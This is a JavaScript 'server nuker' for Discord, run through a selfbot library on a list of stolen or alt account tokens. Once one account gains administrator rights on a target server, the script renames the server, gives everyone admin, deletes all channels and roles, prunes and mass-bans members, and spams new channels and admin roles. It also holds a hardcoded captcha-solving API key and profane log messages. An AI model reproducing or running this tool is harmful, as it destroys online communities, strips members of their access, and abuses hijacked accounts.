///////////////////////////
// Hello everyone ^-^    /
// Discord: y16t        /
////////////////////////

const colors = require('colors');
const axios = require("axios");

(async () => {
    try {
    const banner = `
┳┓       ┓ 
┣┫┏┓┏┓┏┓┏┣┓
┻┛┛ ┗ ┗┻┗┛┗
`


    console.log(banner.bgWhite.yellow)
    console.log(colors.bgCyan.white`Welcome Back!`)
    const {Client, GatewayIntentBits} = require("discord.js-selfbot-v13")


    function createID(length) {
        let result = '';
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        const charactersLength = characters.length;
        let counter = 0;
        while (counter < length) {
            result += characters.charAt(Math.floor(Math.random() * charactersLength));
            counter += 1;
        }
        return result;
    }



    const ServerId = "ServerID TO NUKE";
    const ServerName = "NEW NAME FOR SERVER";
    const ServerIcon = "IMAGE LINK";
    const VoiceName = "VOICE CHANNEL NAME";
    const TextName = "TXT CHANNEL NAME"
    const RolesPrefix = "Fucked |"; // Prefix name role 
    const DefaultRoleId = "Role ID FOR GIVE ANOTHER TOKENS";

    const fs = require('fs')

    const tokensFile = fs.readFileSync("./tokens.txt", {
        encoding: 'utf8', flag: 'r'
    });
    const tokens = tokensFile.split(/\r?\n/);

    const Users = [];

    for (const token of tokens) {
        const client = new Client({
            checkUpdate: false, captchaService: "2captcha", captchaKey: "05fd529fe4e542c9b5f9d0c1048f9873"
        })


        client.on("ready", async () => {
            console.log(`User is Ready --> ${client.user.username}`.bgGreen)
            Users.push(client.user.id);
            const guild = client.guilds.cache.get(ServerId);
            if (!guild) return;
            const checkAdmin = setInterval(async () => {
                if (guild.me.permissions.has("ADMINISTRATOR")) {
                    await clearInterval(checkAdmin);
                    console.log(`[INFO] ${client.user.username} has administrator permissions!`.bgCyan)
                    await nukeServer(guild)
                } else {
                    console.log(`[INFO] trying as ${client.user.username}!`.bgYellow) 
                }
            }, 1)
        })

        async function nukeServer(guild) {
            try {
                console.log("[INFO] Started fucking the server => ".red + guild.name.blue.bold);

                console.log(`[INFO] CHANGING SERVER NAME!`.bgGreen)
                guild.setName(ServerName)
                    .then(() => {
                        console.log(`[INFO] DONE CHANGED SERVER NAME!`.bgGreen)
                    })
                    .catch(() => {
                        console.log("[INFO] ERROR CAN'T CHANGE SERVER NAME".red)
                    })
                console.log(`[INFO] CHANGING SERVER ICON!`.bgGreen)

                guild.setIcon(ServerIcon)
                    .then(() => {
                        console.log(`[INFO] DONE CHANGED SERVER NAME!`.bgGreen)
                    })
                    .catch(() => {
                        console.log("[INFO] ERROR CAN'T CHANGE SERVER NAME".red)
                    })
                console.log(`[INFO] EVERYONE ADMIN IS WORKING!`.bgGreen)
                const everyoneAdmin = setInterval(() => {
                    try {
                        const role = guild.roles.cache.get(guild.id);
                        role.setPermissions(["ADMINISTRATOR", "MANAGE_ROLES", "MANAGE_CHANNELS", "MANAGE_ROLES", "MANAGE_GUILD", "MANAGE_MESSAGES"]);
                    } catch {
                        console.log("[INFO] ERROR CAN'T UPDATE EVERYONE ROLE".red)
                    }
                }, 1)


                    console.log(`[INFO] CHANNELS FUCKER IS WORKING!`.bgGreen)
                    const channels = guild.channels.cache
                    channels.forEach(channel => {
                        try {
                            channel.delete().catch(e => e)
                            console.log(`[INFO] CHANNEL DELETED: ${channel.name}`.cyan)
                        } catch (e) {
                            console.log(`[INFO] ERROR WHILE DELETING A CHANNEL`.red)
                        }
                    })



                console.log(`[INFO] MEMBERS FUCKER IS WORKING!`.bgGreen)
                try {
                    const dRole = guild.roles.cache.get(DefaultRoleId)
                    if (dRole) {
                        console.log(`[INFO] TRYING TO PRUNE MEMBERS!`.bgYellow)
                        guild.members.prune({
                            roles: [dRole.id],
                            reason: ".gg/51",
                            days: 3
                        }).then((c) => {
                            console.log(`[INFO] MEMBERS PRUNED ${c}!`.bgCyan)
                        }).catch(() => {
                            console.log(`[INFO] ERROR WHILE TRYING PRUNE MEMBERS!`.bgBlue)
                        })
                    } else {
                        console.log(`[INFO] NO DEFAULT ROLE FOUND!`.bgBlue)

                    }
                } catch (e) {
                    console.log(`[INFO] ERROR WHILE TRYING PRUNE MEMBERS!`.bgBlue)

                }



                    console.log(`[INFO] ROLES FUCKER IS WORKING!`.bgGreen)
                    const roles = guild.roles.cache
                    roles.forEach(role => {
                        try {
                            if (role.id === DefaultRoleId) return;
                            role.delete().then(() => {
                                console.log(`[INFO] ROLE DELETED: ${role.name}`.bgYellow)
                            }).catch(e => e)
                        } catch (e) {
                            console.log(`[INFO] ERROR WHILE DELETING A ROLE`.red)
                        }
                    })

                console.log(`[INFO] CHANNELS CREATOR!`.green)
                const channelsCreator = setInterval(() => {
                    try {
                        guild.channels.create(VoiceName, {
                            type: "GUILD_VOICE"
                        }).then((channel) => {
                            console.log(`[INFO] VOICE CREATED CHANNEL: ${channel.name}`.cyan)
                        })
                            .catch(() => {
                                console.log(`[INFO] ERROR WHILE DELETING A CHANNEL`.red)
                            })


                        guild.channels.create(TextName, {
                            type: "GUILD_TEXT"
                        }).then((channel) => {
                            console.log(`[INFO] TEXT CREATED CHANNEL: ${channel.name}`.cyan)
                        })
                            .catch(() => {
                                console.log(`[INFO] ERROR WHILE DELETING A CHANNEL`.red)
                            })
                    } catch (e) {
                        console.log(`[INFO] ERROR WHILE CREATING A CHANNEL`.red)
                    }
                }, 50)


                guild.members.fetch().then((members) => {
                    const banMembers = members.filter(m => m.bannable === true)
                    for (let member of banMembers) {
                        try {
                            member = member[1]
                            banAttempt()
                            function banAttempt() {
                                axios.put(`https://discord.com/api/v9/guilds/${guild.id}/bans/${member.user.id}`, {}, {
                                    headers: {
                                        "Authorization": `${token}`
                                    }
                                }).then(async (data) => {
                                    console.log(`[INFO] Fucked`.bgGreen)

                                }).catch(() => {
                                    banAttempt();
                                    console.log(`[INFO] Error`.bgRed)

                                })
                            }

                        } catch (e) {
                            console.log(`[INFO] ERROR WHILE TRYING TO GIVE A BAN`.red)
                        }
                    }
                }).catch((e) => {
                    console.log(e)
                    console.log(`[INFO] ERROR WHILE TRYING TO GIVE A BAN`.red)
                })


                console.log(`[INFO] ROLES CREATOR!`.green)
                const rolesCreator = setInterval(() => {
                    try {
                        guild.roles.create({
                            name: `${RolesPrefix}-${createID(8)}`,
                            reason: ".gg/51",
                            permissions: ["ADMINISTRATOR"],
                        })
                            .then(async (role) => {
                                console.log(`[INFO] ROLE CREATED: ${role.name}`.cyan)
                                Users.forEach((id) => {
                                    guild.members.fetch(id).then((m) => {
                                        m.roles.add(role).catch(() => {
                                            console.log(`[INFO] ERROR WHILE TRYING TO GIVE A ROLE`.red)
                                        });
                                    }).catch(() => {
                                        console.log(`[INFO] ERROR WHILE TRYING TO GIVE A ROLE 1`.red)
                                    })
                                })
                            })
                            .catch(() => {
                                console.log(`[INFO] ERROR WHILE CREATING A ROLE`.red)
                            })
                    } catch (e) {

                    }
                }, 50)


            } catch (e) {
                console.log(`[INFO] Unknown Error 404`.bgRed)
            }
        }

        await client.on("error", () => {
            console.log(`[INFO] Unknown Error 404`.bgRed)
        })

        await client.login(token).catch(e => {
            console.log(`[INFO] Invalid Token`.bgRed)
        })
    }


        } catch (error) {
        console.error('Error:', error);
    }
})();



process.on('uncaughtException', function (err) {
    console.log(`[INFO] Invalid Token`.bgRed)
})
